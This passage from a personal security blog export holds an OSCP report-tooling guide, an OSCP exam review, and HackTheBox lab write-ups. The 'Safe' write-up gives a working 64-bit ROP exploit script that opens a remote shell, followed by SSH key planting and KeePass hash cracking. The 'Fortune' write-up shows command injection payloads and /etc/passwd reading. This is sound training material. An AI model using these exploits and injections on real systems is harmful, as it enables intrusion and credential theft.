install pandoc should do the trick.\nInstall Eisvogel Latex Template # First get the latex template:\ngit clone https://github.com/Wandmalfarbe/pandoc-latex-template After cloning the repository, move the template eisvogel.tex to your pandoc templates folder and rename the file to eisvogel.latex. The location of the templates folder depends on your operating system:\nUnix, Linux, macOS: /Users/USERNAME/.local/share/pandoc/templates/ or /Users/USERNAME/.pandoc/templates/ Windows Vista or later: C:\\Users\\USERNAME\\AppData\\Roaming\\pandoc\\templates\\ If there are no folders called templates or pandoc you need to create them and put the template eisvogel.latex inside.\nI suggest reading through the github repo yourself. \u0026ldquo;Wandmalfarbe\u0026rdquo; has some examples online and you might get some usefull insights out of it.\nInstall Noraj OSCP Template and using Eisvogel # I don\u0026rsquo;t like redoing things that other already did better than me. A google search revealed noraj\u0026rsquo;s template.\nClone noraj\u0026rsquo;s repo:\ngit clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown Looking into the repo take note of the following elements.\ngenerate.rb src output The generate.rb script will do the heavy lifting for you. It will consume a markdown file from your src directory (or any other dir) and creates a pdf file out of it. The Eisvogel Latex Template is used to make it pretty. It also creates a 7z file with your OS-ID as the password.\nIn the src directory you find two markdown-template files. Pick the one you like best. I used the \u0026ldquo;whoisflynn\u0026rdquo; template. I suggest to make a copy of the template and leave the original intact. If you do so and work with a copy you\u0026rsquo;ll need to edit the generate.rb ruby script and include the new file. Same when you host your files in a custom report directory.\nNow you can start writing your own report and make changes rather quickly. Without having to mess with strange formating crap that word or libreoffice are constantly throwing at you.\nFor more details on the usage, visit the repo and check the README.\nMy Workflow # Notebooks, Sub-Notebooks and Notes # So, I told you to optionaly install Joplin. This is only needed when you are not already invested in a different tool for taking notes. I use Joplin for quite a while now and love it. So here\u0026rsquo;s my way of using it in the exam.\nTo take notes I created notebooks and sub-notebooks in Joplin for each machine in the exam. I leave it to you to find a propper stucture. But as a reference on how it could be done, here\u0026rsquo;s an example of one of my HackTheBox notes:\nScreenshots # One thing that you also need to document are screenshots. Whenever I took a screenshot I copied into my clipboard and pasted it in my notes. Joplin will automatically create a markdown link and save it in it\u0026rsquo;s own directory.\nAfter taking the exam, I used the notes to populate the report template and create placeholders for the screenshots. As an example, you can keep something like this in your clipboard:\n![x](/path/to/your/screenshots/x.png) For \u0026ldquo;x\u0026rdquo; I included a meaningfull filename and discription.\nOnce done writing the report you could generate it. But it will fail as is right now - because the path and images for the screenshots doesn\u0026rsquo;t exist at the moment. So create the directory you used as the placeholder. Next you need to populate that folder.\nTo do so, open Joplin and right click on one of the images you dumped in there and you\u0026rsquo;ll get a \u0026ldquo;save as\u0026rdquo; option. Now you can save it in your screenshot folder and give it the same name you used in your report.\nTo make this process of going back and forth quicker, I used a different tool for writing my report than taking my notes. As you might know I used nano. Which I can\u0026rsquo;t recommend. Use VSCode, Sublime or whatever works for you. The key element for me was to use two seperate tools. Have them next to each other so you can scroll through your report until you find a screenshot-placeholer, tab over to Joplin, save the image to the preset folder, give it the name and repeat that.\nWhen you generate your final report now and you missed one screenshot or fat fingered the name, the generation will fail and you get an error. Which is great because you can fix it and can make sure all screenshots are in your report.\nColors # You can use latex commands in your markdown file too.\nTo change the font color do:\n\\textcolor{red}{CRITICAL} To highlight some text do:\n\\colorbox{yellow}{Important-Text} Play with this a bit before taking the exam. Maybe write a sample report with a couple of lab machines. But that\u0026rsquo;s up to you. Please make sure you read the OffSec FAQ and check if this guide still applies to your exam. They do change things.\nAnd that\u0026rsquo;s basicly it.\nHave a nice day!\nx41\n"},{"id":6,"href":"/posts/oscp-review/","title":"Path to OSCP - Review","section":"Blog","content":" Introduction # I think everybody expects some kind of experience-report after getting the \u0026ldquo;OSCP certification\u0026rdquo;. So this is my take on this. Before I dive in - please keep in mind:\nI will only describe how I approached the \u0026ldquo;PWK course\u0026rdquo; and \u0026ldquo;OSCP certification\u0026rdquo;.\nTHIS MIGHT NOT WORK FOR YOU!\nWith this out of the way, let\u0026rsquo;s dive right in.\n[Top]\nPre-Enrollment # My journey started a long time before actually enrolling in the exam in 2019. In fact, everything I\u0026rsquo;ve done at work and at home lead to this.\nI knew years ago that I wanted to shift from a windows sysadmin and active directory architect role into a position in infosec. With this goal in mind I did an inventory of my skills. What do I know? What do I think I need in infosec? And where are my skill-gaps?\nOne of thoses gap were: I wasn\u0026rsquo;t able to code in python. Why python? Because a lot of infosec-tools and exploits are written in python. Surfing on Exploit-DB or Youtube and watching people do stuff helped to get a feeling for this and other gaps.\nLong story short: I bought a python3 book and started learning and coding. I challenged myself on CTF sites which improved my coding a lot as well as other topics in infosec.\nThis process was repeated for other areas aswell. Exploit-Development, Metasploit-Usage, using Linux as my main OS. I started hosting my own mail and webserver. Which also taught me a lot about Linux and how to it works. It made me a better sysadmin too.\nAll this started even before 2008. Twelf years ago.\nAround 2017 I discovered HackTheBox and was hooked right away. I did some of the challenges because I was familiar with that type of CTF. Some weeks (or months) later, I popped my first box on HTB and sucked up every bit of knowledge I was able to get my hands on.\nChipping away on my skill-gap one box and one challenge at a time. At the beginning of 2019 I felt the need to take this a bit further. I had to get the OSCP certification. Just for the sake of it. Just for the challenge. Not at all for fame and attention. ;)\nIn mid 2019 I started with some hands on exploit development exercises. Prior to that - everything I did was just theoretical. It wasn\u0026rsquo;t too difficult to be honest. I had some problems to get started though. A result of my learning style. I need to do things \u0026ldquo;my way\u0026rdquo; to understand what\u0026rsquo;s going on. \u0026ldquo;My way\u0026rdquo; is often \u0026ldquo;the hard way\u0026rdquo; and also \u0026ldquo;might not even work\u0026rdquo;. But the benefit for me is, after failing - I know why I failed.\nI finished the stack overflows right when HTB release the box \u0026ldquo;Safe\u0026rdquo;. An easy rated box with an exploit to gain inital access. But I failed solving it. Well - it was not a OSCP style stack overflow without protections. It had DEP enabled - which ment I had to create a ROP chain. I had never done that.\nSo I tought myself some rop techniques on \u0026ldquo;ROPEmporium\u0026rdquo; over the course of a couple of weeks. You can read more of that in my Safe - Writeup.\nAfter doing all that I called my wife over. Together we spent some time discussing when the course and exam would fit into our calendars. This is really important. The course will take a lot of your spare time. Make sure your loved ones are able to support your journey. In our case - my wife had to take care of our baby for the majority of the time.\nOnce that was out of the way - I enrolled for the course in November 2019. Start of the course was scheduled for the beginning of January 2020. I booked 60 days of lab time. I felt rather confident that this would be sufficient and 90 days would have collided with my wifes plans for april.\n[Top]\nThe Course # So the course started in January 2020. I had three weeks of vaccation left and I used them wisely. Which means, like in my previous years of learning, have a fucking goal in mind. What do you want to achieve? Where are your skillgaps in relation to your set goals and the OSCP exam? Read the \u0026ldquo;OffSec FAQ\u0026rdquo; on the Exam and mark things you\u0026rsquo;ve never done before. For me, pivoting was one of those things. I knew basically what I had to do, but that\u0026rsquo;s not enough. Hands on is the only way to know you can do something.\nSo my inital goals for the lab were:\nGet a foothold in every network present in the lab Compromise at least 2 boxes in each of those networks Get Domain-Admin access Do some of the \u0026ldquo;Big 4\u0026rdquo; machines These goals changed every now and then. Don\u0026rsquo;t be afraid of changing your goals when you find them too hard or too easy.\nFor example, I started with the mindset of NOT doing the exercises in the course-pdf. Then I started doing them. Then I stopped doing them. Do what feels right for you to reach your goals.\nAt the end, I didn\u0026rsquo;t do any of the exercises and didn\u0026rsquo;t file a lab-report. Mainly because for me it was a waste of time. I only had 60 days of lab time to begin with, and 5 points extra wasn\u0026rsquo;t a great incentive to spent 3 weeks on this task. For you, it might be time well spent. Or in other words, this task wasn\u0026rsquo;t in alignment with my goals.\nI took breaks every couple of days. Those days were either family days or a video / pdf day. But never a lab day. Your brain needs to cool off. Take breaks.\nYou can follow my diary on twitter. I have tweeted every day of my lab time and created a collection for you to read. I tried to capture the up and downs of this trip as it happend. Showing that good and bad days are really happing and normal. Don\u0026rsquo;t freak out - you can do this.\n[Top]\nThe Exam # If you\u0026rsquo;ve read my tweets, you know already that I reached all of my set goals within those 60 days. And those 60 days went by really fast. After my lab time expired, I had 2,5 days till my exam. I used one day to go over my notes and update the cheat-sheet I made with the commands I used in the past weeks.\nBy going over it I also refreshed my mind of techniques used at the very beginning of my lab time. Who knows what comes up in the exam, right?. Last but not least I did two of the training exploits again. I haven\u0026rsquo;t done this for weeks and a quick refresher was due.\nFor exam-day my wife and I planned that she and our kid will visit her parents. So I had over 48 hours of absolute silence to do the exam. I can assure you, I would have failed the exam without that. You need to be able to rest and focus.\nThe exam started at 14:45 with the proctor asking me to show my room and going through their checklist. This was straight forward and no technical or other issues were found. However, I was so fucking nervous that it took me like 8 minutes to get the VPN file onto my Kali Box because copy and paste was broken! After wasting precious time, I got the green light to proceed.\nI started with creating notebooks for the machines. Just some plumming work I always do. Then went straight for the bufferoverflow box in the exam. It was the right choice for me, because I was so freaking nervous. The bufferoverflow process OffSec teaches you is very straight forward. Once you know the steps and practiced them, you don\u0026rsquo;t have to think much. This helped me getting over my anxiety.\nI am not sure how long it took me to finish the machine. I guess between 40 and 60 minutes. The other 25 point box was my next target. But I couldn\u0026rsquo;t get in. So I changed my plans after some time and attacked other machines. Around 01:00 and nearly 10 hours into the exam I went to bed. At this point I had not enough points to pass yet. But I was really close.\nAs I went to bed my head was spinning. I had a strange sensation of hearing all sounds around me at once - like without a filter. I was definitely done for the day. My alarm clock was set for 06:00. Only 5 hours of sleep.\nAfter 3,5 hours of sleep (probably just one REM-Cylce ;D) I woke up and had to get back into the exam. A hot shower and a coffee later, I proceeded.\nAround 10:00 I had more than enough points to pass the exam. 4,5 boxes owned. Only the the privesc on the 25 point box was left to do. I stopped hacking and did a reset on all boxes. Then, I went over my notes and all the exploitation steps needed for each box. Took some screenshots that were missing and ran my buffer-overflow exploit one more time to checked if it would still work. Also I checked that all the flags I found were present in my notes, in the screenshots and in the dashboard.\nCHECK! EVERYTHING!\nAfter that I went back to the privesc. But I wasn\u0026rsquo;t able to get something usefull out of it till the end of my exam time. That was it. The exam was over. But then, it hit me\u0026hellip;\n[Top]\nThe Report # After all that, I still wasn\u0026rsquo;t finished. I had to write a report. It was really hard to motivate myself to push on. And time was already ticking. I tried to catch some sleep, but just ended up taking a 2,5 hour break before starting the report.\nMy toolchain for documenting the lab and writing the report worked out great. I might do a seperate blog post on how to set everything up the way I had it. But in a nutshell I used Joplin for my notes. Everything I did was in Joplin. It\u0026rsquo;s one of the best markdown tools for taking notes in my opinion. Setup cloud sync with nextcloud and you don\u0026rsquo;t have to be afraid of losing your progress.\nThe report was written in markdown and then converted to a PDF with pandoc. To make the report pretty I used the Eisvogel Latex-Template. It\u0026rsquo;s quite a hefty setup. But also very powerfull and easy to handle. Worked better than LibreOffice or Word for that matter. At least for me. John Hammond did a video on this setup too.\nThe only thing that was quite a pain, was writing my report with nano. I probably would switch to a graphical editor like VSCode. I didn\u0026rsquo;t use Joplin for the report because for this task, it would have slowed me down.\nIt took me about 10 to 12 hours in total to finish my report. I triple and quadruple checked everything again. Flags? Screenshots? All commands correct? Appendix? Is everything there? Does the password for the 7z archive work? It works. Try again. Ok it still works. But try again - just one fucking more time. Then turn the report in. Done.\n7 days later, I got the sweet sweet email from OffSec. I passed! :)\nHey guys! :)\nGood news! I passed the #OSCP Exam! pic.twitter.com/HhGmMvPEwn\n\u0026mdash; {0x41} (@tagnullde) March 23, 2020 [Top]\nTips # Talk to your loved ones, you\u0026rsquo;ll need their assistance! Identify your skill-gap Define goals for your lab-time and close your skill-gap Take notes and create your personal cheat-sheet Take more screenshots than me ;) Take breaks Keep calm and \\xFF\\xE4 Try harder! ;) Good Luck!\nx41\n[Top]\n"},{"id":7,"href":"/posts/safe/","title":"Safe - WriteUp","section":"Blog","content":" External Recon # You know the dance. We start with nmap.\nnmap -sV -sC -oN initial -T4 10.10.10.147 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA) | 256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA) |_ 256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel As there\u0026rsquo;s not much to see here I visited the website. Only the Apache2 default page was shown. Maybe we can find more about this by running a script scan.\nnmap --script discovery,safe,vuln -oN script -T4 10.10.10.147\nIn the very long output of this scan we can find this line comment out in the source-code\u0026hellip;\n'myapp' can be downloaded to analyze from here its running on port 1337\n\u0026hellip;and when you take a look at the real source code of the website we can confirm it\u0026rsquo;s there.\n[Top]\nExplore # Let\u0026rsquo;s see if \u0026ldquo;Port 1337\u0026rdquo; is indeed open:\nLooks good. When we enter some values the application will echo them back to us.\nLet\u0026rsquo;s try to download \u0026ldquo;myapp\u0026rdquo; from the root of the website.\nSo, as you might have guessed by now, this smells like a \u0026ldquo;buffer overflow\u0026rdquo; challenge. At first I was very excited. An easy rated box with a \u0026ldquo;bof\u0026rdquo;? What an opportunity to test myself. Well, the excitement disappeared after running \u0026ldquo;checksec\u0026rdquo;.\nFirst of all it\u0026rsquo;s a 64Bit binary. Never played with 64Bit \u0026ldquo;buffer overflows\u0026rdquo;. Second it has the \u0026ldquo;NX-Bit\u0026rdquo; set. Which means the \u0026ldquo;Stack\u0026rdquo; is not executable.\nIn order to overcome this, we need to use a exploitation-technique known as \u0026ldquo;ROP - Return Oriented Programming\u0026rdquo;. But, it\u0026rsquo;s an easy rated box - this can\u0026rsquo;t be too hard - right?\n[Top]\nExploit # I had to try it anyways. I spent at least two days trying to figure out how to write an exploit for this. But other than \u0026ldquo;fuzzing\u0026rdquo; the program, finding the \u0026ldquo;offset\u0026rdquo; and such things - I was not able to accomplish much.\nThen I got a tip. \u0026ldquo;There\u0026rsquo;s a tool called \u0026ldquo;ROPStar\u0026rdquo;. I tracked it down and from the description it looked like cheating. You give it a binary or an IP-Address and it will auto-exploit it for you. I downloaded the tool and gave it a shot.\nBut, and that\u0026rsquo;s very important to note here: I set myself a goal to root the box and use the flag to read one of the Hackplayers writeups and analyze the exploit until I can do it myself.\nSo - let\u0026rsquo;s do it the lazy way first.\npython ropstar.py ~/HTB/Boxes/Safe/exploit/myapp\nThis was all to get a local shell on my own system.\npython ropstar.py ~/HTB/Boxes/Safe/exploit/myapp -rhost 10.10.10.147 -rport 1337\nAnd this to get a shell to the box.\nIt took no more than 5 seconds. That\u0026rsquo;s amazing - but not the way I want to solve that box. I can do better than this. After rooting the box and reading the \u0026ldquo;writeup\u0026rdquo; I replicated the \u0026ldquo;exploit\u0026rdquo;. I sort of understood what was going on. But I was still not satisfied. So I started and solved most of the 32Bit ROPEmporium Challenges which are dedicated to teach ROP techniques.\nI came back to \u0026ldquo;safe\u0026rdquo; just to fail again. I checked the \u0026ldquo;copied\u0026rdquo; exploit - but I couldn\u0026rsquo;t understand it anymore. I was frustrated. So I sat down again - and analyzed the \u0026ldquo;exploit\u0026rdquo; from the \u0026ldquo;writeup\u0026rdquo; again. Until I understood it, found my mistake and came to the conclusion that I didn\u0026rsquo;t like the method presented in the writeup. ;D\nI found my own solution. Which I find more intuitive. So here is my solution:\nFirst we need to crash the program to check if it\u0026rsquo;s vulnerable. I didn\u0026rsquo;t used a special \u0026ldquo;fuzzer\u0026rdquo; for that. I just tried a couple of inputs until I found a crash. I used 300 Bytes to generate the crash in the screenshot.\nBefore we can start working on the exploit, we need to find the exact input till we overwrite \u0026ldquo;RSP\u0026rdquo;.\nI had to use gdb-peda\u0026rsquo;s pattern_create for this. I don\u0026rsquo;t know why, but msf-pattern_create produced a pattern that I couldn\u0026rsquo;t use to find the offset. I suspected bad characters and tried to create a custom patter-set. Didn\u0026rsquo;t work either. If you know what\u0026rsquo;s going on here - let me know.\ngdb-peda$ pattern_create 300 pattern.txt\nNext we start \u0026ldquo;myapp\u0026rdquo; with \u0026ldquo;gdb-peda\u0026rdquo; and throw our pattern in.\nIf you don\u0026rsquo;t get a crash you might need to change your \u0026ldquo;peda.py\u0026rdquo; file. At the very bottom are a couple of settings. Change it from: peda.execute(\u0026ldquo;set follow-fork-mode child\u0026rdquo;) to: peda.execute(\u0026ldquo;set follow-fork-mode parent\u0026rdquo;)\nOtherwise the application should crash and \u0026ldquo;RSP\u0026rdquo; has a value of: jAA9AAOAAkAAPAAlAA. We can use this pattern to find the offset.\ngdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAA jAA9AAOAAkAAPAAlAA found at offset: 120 Let\u0026rsquo;s start crafting a first proof of concept and see if we can control \u0026ldquo;RIP\u0026rdquo;.\n#!/usr/bin/python3 from pwn import * payload = b\u0026#39;A\u0026#39; * 120 # offset to RIP payload += p64(0x42424242) # RIP payload += b\u0026#39;C\u0026#39; * 170 # some more junk, because why not f = open(\u0026#34;payload.txt\u0026#34;, \u0026#34;wb\u0026#34;) f.write(payload) This script needs the \u0026ldquo;pwntools\u0026rdquo; library. For now we just use the p64() function as a helper to convert the addresses we will use for our \u0026ldquo;ROPChain\u0026rdquo; to \u0026ldquo;little endian\u0026rdquo; and also to the propper byte sequence.\nOther than that we just fill up the buffer, overwrite \u0026ldquo;RIP\u0026rdquo; and write this to a file. Let\u0026rsquo;s start the application again in \u0026ldquo;gdb-peda\u0026rdquo; and redirect the file\u0026rsquo;s content into it.\nSuccess. \u0026ldquo;RIP\u0026rdquo; has been overwritten with an value we control.\nBut what now? Well, as I\u0026rsquo;ve said, when the \u0026ldquo;NX-Bit\u0026rdquo; is set, we can\u0026rsquo;t jump into the stack to execute our code. But we can still jump around in the existing code. We just need to find some special instructions within the application, chain them together and make the application do things, it was never intended to do.\nLet\u0026rsquo;s get an overview of the functions in the program. \u0026ldquo;objdump\u0026rdquo; is right tool for that. The -M intel parameter changes the display settings to \u0026ldquo;intel\u0026rdquo; syntax. I find it easier to read.\nobjdump -M intel -d myapp\nHere you can see the main() function of the program.\nAnd here\u0026rsquo;s another interesting function called test().\nIn the function main() we can see that some other functions are being called, system() for example. Our goal is now to call system() and while doing so, provide our own arguments like /bin/sh. In 64-Bit applications, arguments are provided via the \u0026ldquo;CPU-Registers\u0026rdquo;. You need to use \u0026ldquo;rdi\u0026rdquo; for your first, \u0026ldquo;rsi\u0026rdquo; for your second and \u0026ldquo;rdx\u0026rdquo; for your third argument. We just want to pass the /bin/sh string, so just one register is needed: \u0026ldquo;rdi\u0026rdquo;. The system() call will be stored in one of the general purpose registers. I\u0026rsquo;ll come back to this in a second. If this is successful, we would get a shell.\nSo, let\u0026rsquo;s take some notes: First we need to find some instructions that pop values we put on the stack, into the registers. I used \u0026ldquo;ropper\u0026rdquo; for this.\n\u0026ldquo;ropper\u0026rdquo; will search for special instructions that end with a ret or return instruction. Hence the name \u0026ldquo;Return Oriented Programming\u0026rdquo;. After the chain is executed, it will return and will execute the next instruction stored in \u0026ldquo;RIP\u0026rdquo;. Which we still control.\nropper -f myapp | grep pop\nOur \u0026ldquo;grep\u0026rdquo; already filtered the output for a couple of \u0026ldquo;pop gadgets\u0026rdquo;. But which one should we use? Well, we need to jump to the register in with we will store the system() address. So let\u0026rsquo;s start with finding a jmp and see if the jmp can tell us which \u0026ldquo;pop gadgets\u0026rdquo; we should use.\n\u0026ldquo;ropper\u0026rdquo; found no suitable jmp for my situation. So I went back to \u0026ldquo;objdump\u0026rdquo; and found a jmp r13 in the test() function.\nThis means we need a pop r13 gadget to store system() and later jmp r13 to call it. In the \u0026ldquo;ropper\u0026rdquo; output you can see a pop r13. Note that there are two more pop\u0026rsquo;s before the ret.\nYou\u0026rsquo;ll see later why this is important.\nWe need also a way to put /bin/sh into \u0026ldquo;rdi\u0026rdquo;. For this, the gadget mov rdi,rsp would be ideal. We can find such an instruction with \u0026ldquo;objdump\u0026rdquo; in the test() function.\nLast but not least, we need the memory address of system().\nLet\u0026rsquo;s check what we\u0026rsquo;ve got so far.\nsystem() @ 0x401040 mov rdi, rsp @ 0x401156 jmp r13 @ 0x401159 pop r13, r14, r15 @ 0x401206 Now we need to put all of them in the right order. First we will send our \u0026ldquo;120 Bytes\u0026rdquo; of junk. Then the address of the pop r13 instruction. It will \u0026ldquo;pop\u0026rdquo; the first value from the \u0026ldquo;stack\u0026rdquo; into \u0026ldquo;r13\u0026rdquo;. We want system() to be in \u0026ldquo;r13\u0026rdquo;. So the address to system() will be next. After pop r13, two more \u0026ldquo;pop\u0026rsquo;s\u0026rdquo; will take place. We need to place two dummy values on the \u0026ldquo;stack\u0026rdquo; to account for that. Now we need to prepare the arguments for the system() call. So the address to mov rdi, rsp will be next, followed by the string /bin/sh\\x00.\nYou might have noticed that the jmp r13 doesn\u0026rsquo;t need to be put into our \u0026ldquo;rop-chain\u0026rdquo; directly. It\u0026rsquo;s the next instruction after mov rdi, rsp and will be executed after that. How nice. ;)\nLet\u0026rsquo;s put all of this into an exploit script.\n#!/usr/bin/python3 from pwn import * # Stage 0 junk = b\u0026#39;A\u0026#39; * 120 # Overflow cmd = b\u0026#39;/bin/sh\\x00\u0026#39; # Argument # ROP pop = p64(0x401206) # pop r13 mov = p64(0x401156) # mov rdi, rsp # RCE fake = p64(0x000000) # dummy value for pop r14 and pop r15 system = p64(0x401040) # system address # Create Payload payload = junk + pop + system + fake + fake + mov + cmd f = open(\u0026#34;payload.txt\u0026#34;, \u0026#34;wb\u0026#34;) f.write(payload) After running the script we will have our payload in a text file called \u0026ldquo;payload.txt\u0026rdquo;. You could try to redirect the contents into the application like so:\n./myapp \u0026lt; payload.txt\nBut you will just get a \u0026ldquo;segfault\u0026rdquo;. Why is that? Well, it took me a while to find an answer for that - but here it is. When you hit enter on the above command, the application will start up and get to the point where you can feed it data via \u0026ldquo;stdin\u0026rdquo;. The exploit code will be copied into the buffer, will do it\u0026rsquo;s thing and start up a shell. But, because the \u0026ldquo;stdin\u0026rdquo; will be closed now (no more data is in the text file) the shell will close and the function will return and since we corrupted the stack it will segfault. So our task is to keep the shell alive by holding \u0026ldquo;stdin\u0026rdquo; open.\nThe following command will do just that.\n(cat payload.txt; cat) | ./myapp\nThe first \u0026ldquo;cat payload.txt\u0026rdquo; will feed the exploit into the application. When the shell is up and running, the second \u0026ldquo;cat\u0026rdquo; kicks in. Because we didn\u0026rsquo;t give it any arguments it will be just an interactive \u0026ldquo;echo\u0026rdquo; tool. Try it yourself. Start \u0026ldquo;cat\u0026rdquo; without parameters and enter something. Whatever will be entered, \u0026ldquo;cat\u0026rdquo; will echo it back. So you feed data in via \u0026ldquo;stdin\u0026rdquo; and \u0026ldquo;cat\u0026rdquo; will echo it back via \u0026ldquo;stdout\u0026rdquo;. The \u0026ldquo;pipe\u0026rdquo; will transport that to the application which is now your shell. Elegant right?\nBut, can we use this technique remotely too? Sure we can. We will replace the local application with \u0026ldquo;nc\u0026rdquo; and connect to the service that\u0026rsquo;s running on the \u0026ldquo;HackTheBox\u0026rdquo; machine.\nWe are in! :) And we also have access to the user.txt.\nBetween rooting this box and writing this writeup I played a lot with this binary. This is why I also have a \u0026ldquo;pwntools\u0026rdquo; version of this exploit. This version doesn\u0026rsquo;t need the \u0026ldquo;cat\u0026rdquo; magic.\n#!/usr/bin/python3 from pwn import * # PwnTools context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;]) #p = process(\u0026#34;./myapp\u0026#34;) #gdb.attach(p, \u0026#34;b *0x401206\u0026#34;) p = remote(\u0026#34;10.10.10.147\u0026#34;, 1337) # Stage 0 junk = b\u0026#39;A\u0026#39; * 120 # Overflow cmd = b\u0026#39;/bin/sh\\x00\u0026#39; # RCE # ROP pop = p64(0x401206) jmp = p64(0x401156) # RCE fake = p64(0x000000) system = p64(0x401040) # Create Payload payload = junk + pop + system + fake + fake + jmp + cmd p.sendline(payload) p.interactive() [Top]\nInternal Recon # Phew. That was quite a trip. But the last part is super easy. In the user folder, next to the user.txt we already see a \u0026ldquo;keepass-database\u0026rdquo; and a bunch of files..\nIf you don\u0026rsquo;t know keepass: It\u0026rsquo;s a \u0026ldquo;password manager\u0026rdquo;. Keepass, like many other password managers, have a feature where you can enter your password and a keyfile. Which can be anything. A text file. An image. Something that won\u0026rsquo;t change. And it will be used as a second factor to the password.\nSeems logical that we try cracking the \u0026ldquo;keepass-database\u0026rdquo; before anything else.\n[Top]\nPrivilege Escalation # To download the files, we first need better access. Let\u0026rsquo;s deploy a \u0026ldquo;ssh-key\u0026rdquo; on the box and login with a real shell.\nFirst we generate a new key and get the public part of it:\nThen we \u0026ldquo;echo\u0026rdquo; it over into the /home/user/.ssh/authorized_keys file.\nNow we can login but also download all files.\nscp -i /root/HTB/Boxes/Safe/id_rsa -r user@10.10.10.147:/home/user/ /root/HTB/Boxes/Safe/Download\nNow we need to extract the hash from the database and also provide the images as a second factor.\nkeepass2john -k $Images\nWe will use \u0026ldquo;hashcat\u0026rdquo; to crack the hashes. \u0026ldquo;Hashcat\u0026rdquo; doesn\u0026rsquo;t need the \u0026ldquo;MyPassword\u0026rdquo; string so I removed it and started cracking.\nhashcat -m 13400 -a 0 -w 1 hashes.txt /usr/share/wordlists/rockyou.txt --force\nIn my case the 3rd key was correct and the password is: bullshit.\n[Top]\nRoot Flag # Armed with this \u0026ldquo;password\u0026rdquo; we can open the password-safe and get the password for root.\nIf you don\u0026rsquo;t have keepass installed on your box apt install keepassx will do the trick.\nA simple su - get\u0026rsquo;s us the root flag.\nBox solved. But most important - I learned a lot of new things! :)\nTill next time!\nx41\n[Top]\n"},{"id":8,"href":"/posts/fortune/","title":"Fortune - WriteUp","section":"Blog","content":" External Recon # I started with my usual \u0026ldquo;nmap\u0026rdquo; scan:\nnmap -sC -sV -oN initial 10.10.10.127 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol2.0) 80/tcp open http OpenBSD httpd |_http-server-header: OpenBSD httpd |_http-title: Fortune 443/tcp open ssl/https? Most of the time you\u0026rsquo;ll have the best chances to find something on the webservices rather than \u0026ldquo;ssh\u0026rdquo;.\nSo let\u0026rsquo;s take a look at \u0026ldquo;port 80\u0026rdquo;:\nYou can select a fortune-database as it seems and get a fortune-cookie.\nTo make the writeup easier to follow we\u0026rsquo;ll explore \u0026ldquo;port 443\u0026rdquo; later. In reality I checked \u0026ldquo;port 443\u0026rdquo; at this point to get an high level overview before exploring \u0026ldquo;port 80\u0026rdquo; further.\nTo see what\u0026rsquo;s happening in the background - let\u0026rsquo;s sent the request to \u0026ldquo;burp\u0026rdquo;.\nAs you can see, with our selection on the site, we filled the db= paramenter. This looks like a good place to inject some stuff. First I tried \u0026ldquo;SQLi\u0026rdquo; with \u0026ldquo;SQLMap\u0026rdquo; without any success. I\u0026rsquo;ve learned: Always try different tools as they might yield different results. So I used \u0026ldquo;wfuzz\u0026rdquo; with a generic \u0026ldquo;SQLi\u0026rdquo; wordlist from \u0026ldquo;SecList\u0026rdquo;.\nwfuzz -c -z file,/opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://10.10.10.127/select\nAt first, I thought this was a dead-end too. Also I thought I crashed my \u0026ldquo;kali\u0026rdquo; because my terminal wasn\u0026rsquo;t responding. But my terminal came back to life and I almost cleared my screen to try something else. I noticed that the very last injection was this:\n\u0026quot;%20$(sleep%2050)\u0026quot;\nIt\u0026rsquo;s a 50 second sleep! I rushed back to \u0026ldquo;burp\u0026rdquo; to verify that with a 3 second sleep. And it worked! We have command execution!\nI played a long time with this \u0026ldquo;feature\u0026rdquo; to get a \u0026ldquo;reverse-shell\u0026rdquo;. But I failed. So I tried getting some type of \u0026ldquo;ICMP Tunnel\u0026rdquo; going because it seemed that only \u0026ldquo;ICMP\u0026rdquo; was allowed.\nBut after hours of poking at it, I asked a buddy if I am in a rabbit-hole of some sorts. He just laughed and said, that he made the very same mistake and wasted hours too.\nWe both forgot about the basics of injection. Both of us did the injections like this:\ndb=$(ping -c 1 10.10.14.5)\nWhich is basically a \u0026ldquo;sub-bash\u0026rdquo;. Which doesn\u0026rsquo;t give you the same experience as a \u0026ldquo;native\u0026rdquo; bash-process. It won\u0026rsquo;t return output of commands like ls -la. So what\u0026rsquo;s the solution to this? Well, append a command to the existing one.\ndb=; ping -c 1 10.10.14.5\nEasy! Well, when you remember the stuff you\u0026rsquo;ve done a dozen times by now. However, I wasn\u0026rsquo;t able so spawn a \u0026ldquo;reverse-shell\u0026rdquo; this way. So I spent some time enumerating the filesystem.\n[Top]\nExplore # I started with id and /etc/passwd to see who\u0026rsquo;s boss on that box.\ndb=; id uid=512(_fortune) gid=512(_fortune) groups=512(_fortune) db=; cat /etc/passwd charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh bob:*:1001:1001::/home/bob:/bin/ksh nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf The \u0026ldquo;nfsuser\u0026rdquo; sticks out. I expected a couple of normal users, but a service user like this should make you wondering what it does. ;)\nMost configs for services are in \u0026ldquo;/etc\u0026rdquo; so I started my search there. And sure enough I found the configs for \u0026ldquo;authpf\u0026rdquo; there. Why \u0026ldquo;authpf\u0026rdquo;? It\u0026rsquo;s in the path of \u0026ldquo;nfsuser\u0026rdquo;. Unfortunately we can\u0026rsquo;t access them with our current permissions.\nSo I checked his \u0026ldquo;/home\u0026rdquo; directory.\ndb=; ls -la /home/nfsuser\nThis was a dead end too. Let\u0026rsquo;s check \u0026ldquo;port 443\u0026rdquo; then.\n\u0026ldquo;Firefox\u0026rdquo; greets us with a strange \u0026ldquo;Unknown_CA_error\u0026rdquo;. Let\u0026rsquo;s edit our \u0026ldquo;/etc/hosts\u0026rdquo; files and use a hostname, but I got the 